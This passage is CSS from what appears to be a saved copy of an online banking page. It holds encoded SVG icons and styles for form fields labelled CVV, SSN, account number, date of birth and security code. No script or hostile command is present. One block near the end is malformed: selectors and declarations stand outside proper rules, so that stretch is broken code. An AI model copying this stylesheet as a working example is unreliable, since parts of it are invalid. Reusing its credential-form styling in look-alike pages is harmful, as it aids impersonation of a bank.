0398%2C0.133-0.38397%2C0.33301-0.45197l8.00098-2.72803c0.10803-0.03601%2C0.22601-0.03601%2C0.33405%2C0l8.07996%2C2.729%0A%09%09c0.20001%2C0.06799%2C0.33405%2C0.24896%2C0.33405%2C0.453v4.98401c-0.51105-0.10901-1.039-0.17004-1.58203-0.17004%0A%09%09c-0.20697%2C0-0.41101%2C0.01501-0.61401%2C0.03101v-2.35895c0-0.617-0.41199-1.16602-1.02301-1.362l-5.03296-1.62006%0A%09%09c-0.31799-0.10199-0.66302-0.09998-0.97803%2C0.00806l-4.73798%2C1.60699c-0.599%2C0.20398-0.99902%2C0.74597-0.99902%2C1.35498v5.96198%0A%09%09c0%2C1.55804%2C0.71899%2C3.03503%2C1.96503%2C4.03705l3.31598%2C2.66595c0.367%2C0.29504%2C0.84198%2C0.37903%2C1.28503%2C0.28503%0A%09%09c0.36096%2C0.789%2C0.85095%2C1.50598%2C1.448%2C2.11896L17.80298%2C30.77673z%20M17.328%2C26.67377c-0.10303-0.005-0.20502-0.03503-0.289-0.10205%0A%09%09l-3.31598-2.66595c-1.02002-0.82001-1.60803-2.02899-1.60803-3.30304v-5.96198c0-0.203%2C0.133-0.38403%2C0.33301-0.45203%0A%09%09l4.73798-1.60699c0.10504-0.03601%2C0.22003-0.03699%2C0.32605-0.00299l5.03296%2C1.62c0.203%2C0.065%2C0.341%2C0.24799%2C0.341%2C0.45404v2.50696%0A%09%09C19.52002%2C17.89874%2C17%2C20.89374%2C17%2C24.48077C17%2C25.24475%2C17.11603%2C25.98077%2C17.328%2C26.67377z%20M31%2C24.48077%0A%09%09c0%2C3.58997-2.90997%2C6.5-6.5%2C6.5s-6.5-2.91003-6.5-6.5c0-3.59003%2C2.90997-6.50006%2C6.5-6.50006S31%2C20.89075%2C31%2C24.48077z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-yen[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3Anone%3B%7D.cls-2%7Bfill%3A%23002d72%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_b_rgb_yen%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2221.01%2022%2025%2022%2025%2020%2021.01%2020%2021.01%2018.2%2030.57%2013.11%2029.63%2011.34%2019.98%2016.48%2010.33%2011.34%209.39%2013.11%2019.01%2018.23%2019.01%2020%2015%2020%2015%2022%2019.01%2022%2019.01%2024%2015%2024%2015%2026%2019.01%2026%2019.01%2032%2021.01%2032%2021.01%2026%2025%2026%2025%2024%2021.01%2024%2021.01%2022%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-location[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M11%2C16.69958c0%2C3.10004%2C2.90002%2C8.10004%2C8.59998%2C15.10004c0.20001%2C0.20001%2C0.60004%2C0.20001%2C0.80005%2C0%0A%09%09C26.09998%2C24.8996%2C29%2C19.79962%2C29%2C16.69958c0-4.79999-4.09998-8.69995-9-8.69995S11%2C11.99963%2C11%2C16.69958z%20M28%2C16.69958%0A%09%09c0%2C2.70001-2.70001%2C7.5-8%2C14c-5.29999-6.5-8-11.19995-8-14c0-4.19995%2C3.70001-7.69995%2C8-7.69995S28%2C12.49963%2C28%2C16.69958z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M15%2C16.99963c0%2C2.79999%2C2.20001%2C5%2C5%2C5s5-2.20001%2C5-5c0-2.80005-2.20001-5-5-5S15%2C14.19958%2C15%2C16.99963z%0A%09%09%20M24%2C16.99963c0%2C2.20911-1.79083%2C4-4%2C4s-4-1.79089-4-4c0-2.20917%2C1.79083-4%2C4-4S24%2C14.79047%2C24%2C16.99963z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-service[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cpath%20class%3D%22st0%22%20d%3D%22M23%2C26.99927h-4c-0.552%2C0-1%2C0.44696-1%2C1v2c0%2C0.55298%2C0.448%2C1%2C1%2C1h4c0.55298%2C0%2C1-0.44702%2C1-1v-0.51801%0A%09c0.16901-0.03705%2C0.32202-0.06903%2C0.40198-0.086c2.74805-0.60004%2C3.99805-1.146%2C4.73303-2.396H30c1.104%2C0%2C2-0.89606%2C2-2v-5%0A%09c0-1.104-0.896-2-2-2c0-5.164-4.271-9-9.75-9s-9.75%2C3.836-9.75%2C9H10c-1.104%2C0-2%2C0.896-2%2C2v5c0%2C1.10394%2C0.896%2C2%2C2%2C2h2%0A%09c0.552%2C0%2C1-0.44702%2C1-1v-7c0-0.552-0.448-1-1-1h-0.5c0-4.586%2C3.79999-8%2C8.75-8s8.75%2C3.414%2C8.75%2C8h-1c-0.55298%2C0-1%2C0.448-1%2C1v7%0A%09c0%2C0.51599%2C0.39502%2C0.92395%2C0.896%2C0.979c-0.63202%2C0.62-1.70599%2C1.00299-3.70697%2C1.43896%0A%09c-0.04303%2C0.01003-0.112%2C0.024-0.18903%2C0.04103v-0.45898C24%2C27.44623%2C23.55298%2C26.99927%2C23%2C26.99927z%20M23%2C29.75446%0A%09c0%2C0.13519-0.10962%2C0.24481-0.24481%2C0.24481h-3.51038C19.10962%2C29.99927%2C19%2C29.88965%2C19%2C29.75446v-1.51038%0A%09c0-0.13525%2C0.10962-0.24481%2C0.24481-0.24481h3.51038c0.13519%2C0%2C0.24481%2C0.10956%2C0.24481%2C0.24481V29.75446z%20M11.75519%2C18.99927%0A%09c0.13519%2C0%2C0.24481%2C0.10956%2C0.24481%2C0.24481v6.51038c0%2C0.13519-0.10962%2C0.24481-0.24481%2C0.24481h-1.51038%0A%09C9.55731%2C25.99927%2C9%2C25.44189%2C9%2C24.75446v-4.51038c0-0.6875%2C0.55731-1.24481%2C1.24481-1.24481H11.75519z%20M28%2C18.99927h2%0A%09c0.55298%2C0%2C1%2C0.448%2C1%2C1v5c0%2C0.55298-0.44702%2C1-1%2C1h-2V18.99927z%22%2F%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-pointer[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20x%3D%220px%22%20y%3D%220px%22%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cpath%20class%3D%22st0%22%20d%3D%22M12.5%2C28.99963l4.20001%2C2.5c0.29999%2C0.09998%2C0.59998%2C0%2C0.70001-0.20001l4.79999-8.20001l3.89996%2C2.20001%20%20c0.40002%2C0.20001%2C0.80005%2C0%2C0.80005-0.40002l0.5-15.89996c0-0.30005-0.20001-0.5-0.40002-0.5c-0.09998%2C0-0.20001%2C0-0.29999%2C0.09998%20%20l-13.5%2C8.40002c-0.29999%2C0.19995-0.29999%2C0.69995%2C0%2C0.89996l3.89996%2C2.20001l-4.79999%2C8.20001%20%20C12.20001%2C28.59961%2C12.29999%2C28.8996%2C12.5%2C28.99963z%20M18.20001%2C20.09961c0.09998-0.29999%2C0-0.59998-0.20001-0.70001%20%20l-3.59998-2.09998l12-7.40002L26%2C23.99963l-3.59998-2.10004c-0.30005-0.09998-0.60004%2C0-0.70001%2C0.20001l-4.79999%2C8.20001l-3.5-2%20%20L18.20001%2C20.09961z%22%2F%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-cardPin[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20x%3D%220px%22%20y%3D%220px%22%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M11.5%2C21.99927h2c0.66699%2C0%2C0.66699-1%2C0-1h-2C10.83301%2C20.99927%2C10.83301%2C21.99927%2C11.5%2C21.99927z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M16.5%2C21.99927h2c0.66699%2C0%2C0.66699-1%2C0-1h-2C15.83301%2C20.99927%2C15.83301%2C21.99927%2C16.5%2C21.99927z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M26.5%2C21.99927h2c0.66699%2C0%2C0.66699-1%2C0-1h-2C25.83301%2C20.99927%2C25.83301%2C21.99927%2C26.5%2C21.99927z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M9.6496%2C10.99927c-0.914%2C0-1.65002%2C0.776-1.65002%2C1.71399v14.57196c0%2C0.93805%2C0.73602%2C1.71405%2C1.65002%2C1.71405%20%20%20h20.70001c0.91602%2C0%2C1.64996-0.776%2C1.64996-1.71405V12.71326c0-0.93799-0.73395-1.71399-1.64996-1.71399%20%20%20C30.34961%2C10.99927%2C9.6496%2C10.99927%2C9.6496%2C10.99927z%20M30.99957%2C27.28522c0%2C0.39801-0.29895%2C0.71405-0.64996%2C0.71405H9.6496%20%20%20c-0.34998%2C0-0.65002-0.31604-0.65002-0.71405V15.99927h22C30.99958%2C15.99927%2C30.99958%2C27.28522%2C30.99957%2C27.28522z%20%20%20%20M30.99957%2C12.71326v2.28601h-22v-2.28601c0-0.39801%2C0.30005-0.71399%2C0.65002-0.71399H30.3496%20%20%20C30.70062%2C11.99927%2C30.99957%2C12.31525%2C30.99957%2C12.71326z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M21.5%2C21.99927h2c0.66699%2C0%2C0.66699-1%2C0-1h-2C20.83301%2C20.99927%2C20.83301%2C21.99927%2C21.5%2C21.99927z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-green-checkmark[_ngcontent-yta-c101]+.cbolui-icon-text[_ngcontent-yta-c101],
    .cbolui-icon-lg-red-error[_ngcontent-yta-c101]+.cbolui-icon-text[_ngcontent-yta-c101],
    .cbolui-icon-red-icon_X[_ngcontent-yta-c101]+.cbolui-icon-text[_ngcontent-yta-c101] {
      flex: 1;
      -webkit-box-flex: 1;
      -ms-flex: 1;
      margin-top: 20px
    }

    .icon-GreenCheck[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Csvg%20width%3D%2220px%22%20height%3D%2220px%22%20viewBox%3D%220%200%2020%2020%22%20version%3D%221.1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%3E%0A%20%20%20%20%3C%21--%20Generator%3A%20Sketch%2046.1%20%2844463%29%20-%20http%3A//www.bohemiancoding.com/sketch%20--%3E%0A%20%20%20%20%3Ctitle%3EIcon%3C/title%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C/desc%3E%0A%20%20%20%20%3Cdefs%3E%3C/defs%3E%0A%20%20%20%20%3Cg%20id%3D%22P1.-Banner-Alerts%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%221.1A_Desktop%22%20transform%3D%22translate%28-60.000000%2C%20-809.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Page-Level%22%20transform%3D%22translate%280.000000%2C%20213.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22White-Banner%22%20transform%3D%22translate%2820.000000%2C%20470.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Success-Banner%22%20transform%3D%22translate%280.000000%2C%20104.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Icon%22%20transform%3D%22translate%2840.000000%2C%2022.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22Oval-5%22%20fill%3D%22%23006E0A%22%20cx%3D%2210%22%20cy%3D%2210%22%20r%3D%2210%22%3E%3C/circle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpolygon%20id%3D%22Fill-4%22%20fill%3D%22%23FFFFFF%22%20points%3D%228.24403195%2012.0121714%205.68262639%209.50897143%204.28571429%2010.8737714%208.24403195%2014.7421714%2016.394286%206.79377143%2014.9969739%205.42857143%22%3E%3C/polygon%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%3C/g%3E%0A%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px
    }

    .icon-RedAlert[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Csvg%20width%3D%2220px%22%20height%3D%2220px%22%20viewBox%3D%220%200%2020%2020%22%20version%3D%221.1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%3E%0A%20%20%20%20%3C%21--%20Generator%3A%20Sketch%2046.1%20%2844463%29%20-%20http%3A//www.bohemiancoding.com/sketch%20--%3E%0A%20%20%20%20%3Ctitle%3EIcon%3C/title%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C/desc%3E%0A%20%20%20%20%3Cdefs%3E%3C/defs%3E%0A%20%20%20%20%3Cg%20id%3D%22P1.-Banner-Alerts%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%221.1A_Desktop%22%20transform%3D%22translate%28-60.000000%2C%20-705.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Page-Level%22%20transform%3D%22translate%280.000000%2C%20213.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22White-Banner%22%20transform%3D%22translate%2820.000000%2C%20470.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Critical-Banner%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Icon%22%20transform%3D%22translate%2840.000000%2C%2022.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ccircle%20id%3D%22red-base%22%20fill%3D%22%23D60000%22%20cx%3D%2210%22%20cy%3D%2210%22%20r%3D%2210%22%3E%3C/circle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M11.48%2C8.608%20L11.48%2C4%20L9.24%2C4%20L9.24%2C8.608%20L9.608%2C11.68%20L11.112%2C11.68%20L11.48%2C8.608%20Z%20M11.72%2C14.016%20C11.72%2C13.28%2011.096%2C12.656%2010.36%2C12.656%20C9.624%2C12.656%209%2C13.28%209%2C14.016%20C9%2C14.752%209.624%2C15.376%2010.36%2C15.376%20C11.096%2C15.376%2011.72%2C14.752%2011.72%2C14.016%20L11.72%2C14.016%20Z%22%20id%3D%22%21%22%20fill%3D%22%23FFFFFF%22%3E%3C/path%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%3C/g%3E%0A%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px
    }

    .icon-BlueSpeech[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3Csvg%20width%3D%2216px%22%20height%3D%2216px%22%20viewBox%3D%220%200%2016%2016%22%20version%3D%221.1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%3E%0A%20%20%20%20%3C%21--%20Generator%3A%20Sketch%2046.1%20%2844463%29%20-%20http%3A//www.bohemiancoding.com/sketch%20--%3E%0A%20%20%20%20%3Ctitle%3EIcon%3C/title%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C/desc%3E%0A%20%20%20%20%3Cdefs%3E%3C/defs%3E%0A%20%20%20%20%3Cg%20id%3D%22P1.-Banner-Alerts%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%221.1A_Desktop%22%20transform%3D%22translate%28-62.000000%2C%20-916.000000%29%22%20fill%3D%22%23056DAE%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Page-Level%22%20transform%3D%22translate%280.000000%2C%20213.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22White-Banner%22%20transform%3D%22translate%2820.000000%2C%20470.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Marketing-Banner%22%20transform%3D%22translate%280.000000%2C%20208.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Icon%22%20transform%3D%22translate%2840.000000%2C%2022.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Alert-Bubble%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Icon%22%20transform%3D%22translate%282.000000%2C%203.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Crect%20id%3D%22Sq%22%20x%3D%220%22%20y%3D%220%22%20width%3D%2216%22%20height%3D%2211%22%3E%3C/rect%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpolygon%20id%3D%22Tri%22%20points%3D%224%2011%2011%2011%204%2016%22%3E%3C/polygon%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%3C/g%3E%0A%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px
    }
  </style>
  <style>
    .inline-content {
      background-color: #fff !important;
      padding-left: 20px !important;
      padding-top: 0 !important;
      padding-bottom: 0 !important
    }

    input::-ms-clear,
    input::-ms-reveal {
      display: none
    }

    .cvvImg[_ngcontent-tly-c277] {
      display: flex
    }

    #hello[_ngcontent-tly-c277] {
      width: 100px
    }

    .inline-content label {
      padding: 0 !important
    }

    .margin-left[_ngcontent-tly-c277] {
      margin-left: 10px
    }

    [_nghost-tly-c277] #zipCode div {
      margin-top: 0 !important
    }

    [_nghost-tly-c277] #ssnInput div div div div.inline-content {
      margin-bottom: 8px !important
    }

    span#accountNumber[_ngcontent-tly-c277] {
      margin-top: 15px
    }

    .col-form-label[_ngcontent-tly-c277] {
      padding-top: 0;
      padding-bottom: 0;
      margin-top: 0;
      margin-bottom: 0;
      font-size: 16px;
      line-height: 1.5
    }

    #CVV[_ngcontent-tly-c277] {
      padding-bottom: 10px
    }

    #CVV[_ngcontent-tly-c277] .form-control-container {
      padding-left: 0 !important
    }

    .cardArtImage[_ngcontent-tly-c277] img[_ngcontent-tly-c277] {
      margin-top: 22px
    }

    #accountDetailsPage[_ngcontent-tly-c277] {
      margin-left: 0 !important;
      margin-right: 0 !important
    }

    .seperator[_ngcontent-tly-c277] {
      margin-bottom: 25px
    }

    .cardHolderType legend {
      margin: 0 0 10px !important;
      font-size: 1rem !important;
      margin: 0 0 5px !important
    }

    .datepickerDOB legend {
      margin: 0 0 8px !important
    }

    .cardArtImage[_ngcontent-tly-c277] {
      margin-left: 20px
    }

    .no-padding-left[_ngcontent-tly-c277] div:first-child,
    .no-padding-left[_ngcontent-tly-c277] div[_ngcontent-tly-c277]:first-child {
      padding-left: 0
    }

    #securityCodelabel,
    #stcCodelabel {
      opacity: 1 !important
    }

    .dob-label[_ngcontent-tly-c277] {
      font-size: 14px;
      margin-bottom: -20px
    }

    .cbolui-ddl-post[_ngcontent-tly-c277] .horizontal-rule[_ngcontent-tly-c277] {
      border-top: 0;
      border-bottom: 0
    }

    [_nghost-tly-c277] .add-on-post {
      position: absolute;
      top: 32px;
      right: 1px
    }

    [_nghost-tly-c277] .add-on-post a.showHideMask {
      display: inline;
      font-size: 12px;
      color: #056dae;
      font-weight: 700
    }

    @media only screen and (max-width:991px) {
      .continueBtn[_ngcontent-tly-c277] {
        width: 216px;
        align-self: center
      }

      .ctaButtons[_ngcontent-tly-c277] {
        display: flex;
        flex-direction: column
      }

      .cancelBtn[_ngcontent-tly-c277] {
        padding: 0 0 0 26px;
        align-self: center
      }

      .cancelBtn-mrg[_ngcontent-tly-c277] {
        margin-bottom: 30px
      }
    }

    @media (min-width:991px) {
      hr[_ngcontent-tly-c277] {
        width: 70%
      }
    }

    .container[_ngcontent-tly-c277] .box[_ngcontent-tly-c277] {
      display: inline;
      margin-left: -2% !important
    }

    .container[_ngcontent-tly-c277] .box[_ngcontent-tly-c277] .box-row[_ngcontent-tly-c277] {
      display: inline
    }

    .container[_ngcontent-tly-c277] .box[_ngcontent-tly-c277] .box-cell[_ngcontent-tly-c277] {
      display: inline;
      padding: 2px
    }

    @media only screen and (max-width:994px) {
      .container[_ngcontent-tly-c277] .box[_ngcontent-tly-c277] {
        display: inline;
        margin-left: -2% !important
      }

      .container[_ngcontent-tly-c277] .box[_ngcontent-tly-c277] .box-row[_ngcontent-tly-c277] {
        display: inline;
        margin-left: -8% !important
      }

      .container[_ngcontent-tly-c277] .box[_ngcontent-tly-c277] .box-cell[_ngcontent-tly-c277] {
        display: inline
      }
    }
  </style>


  <style>
    .cbolui-icon-globalSpriteBase[_ngcontent-boo-c101] {
      padding-right: 7px;
      top: 3px;
      font-size: 20px;
      height: 20px
    }

    .cbolui-icon-wrapper[_ngcontent-boo-c101] {
      padding: 15px;
      margin-bottom: 24px;
      border: 1px solid transparent;
      border-radius: 6px;
      display: flex;
      display: -webkit-flex
    }

    .cbolui-icon-wrapper[_ngcontent-boo-c101] .iconClass[_ngcontent-boo-c101] {
      margin-right: 10px;
      padding-right: 0 !important;
      flex-shrink: 0
    }

    .cbolui-icon-red[_ngcontent-boo-c101] {
      color: #d60000
    }

    .cbolui-icon-blue[_ngcontent-boo-c101] {
      color: #056dae;
      margin-top: 5px
    }

    .cbolui-icon-orange[_ngcontent-boo-c101] {
      color: #cb6015
    }

    .cbolui-icon-green[_ngcontent-boo-c101] {
      color: #006e0a
    }

    .checkmark-icon[_ngcontent-boo-c101] {
      width: 15px;
      height: 10px;
      top: 8px
    }

    .glyphicon-triangle-down[_ngcontent-boo-c101],
    background-repeat:no-repeat;
    width:20px;
    height:24px;
    background-size:20px 24px
    }

    background-repeat:no-repeat;
    width:20px;
    height:24px;
    background-size:20px 24px
    }

    background-size:20px 24px
    }

    .cbolui-icon-unlock[_ngcontent-boo-c101]background-repeat:no-repeat;
    width:20px;
    height:24px;
    background-size:20px 24px
    }

    .cbolui-icon-cardPin[_ngcontent-boo-c101] {
      background-repeat: no-repeat;
      width: 20px
    }

    .icon-RedAlert[_ngcontent-boo-c101] {
      background-image: url("download.svg");
      background-repeat: no-repeat;
      width: 20px
    }
  </style>

  <style>
    .alertOpen[_ngcontent-boo-c53] {
      display: block
    }

    .alertClose[_ngcontent-boo-c53] {
      display: none
    }

    .ct-banner_alert_font[_ngcontent-boo-c53] {
      font-family: sans-serif
    }

    .ct-cbolui-module-banner[_ngcontent-boo-c53] .cbolui-icon-text,
    .ct-cbolui-page-banner[_ngcontent-boo-c53] .cbolui-icon-text {
      width: calc(100% - 30px)
    }

    .ct-cbolui-page-banner[_ngcontent-boo-c53] .ct-banner-alert-box[_ngcontent-boo-c53] {
      padding: 20px 20px 20px 30px;
      margin: 20px 0
    }

